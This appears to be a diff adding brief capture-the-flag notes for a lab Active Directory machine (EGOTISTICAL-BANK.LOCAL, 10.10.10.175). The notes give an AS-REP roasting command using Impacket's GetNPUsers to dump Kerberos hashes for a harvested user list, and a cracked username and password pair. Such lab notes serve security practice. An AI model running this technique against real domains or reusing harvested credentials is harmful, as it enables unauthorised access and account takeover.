@@ -1,0 +1,5 @@
+get list of admins on the web page (see users.txt)
+
+python3 GetNPUsers.pt EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -outputfile hash.txt -dc-ip 10.10.10.175
+
+fmsith:Thestrokes23
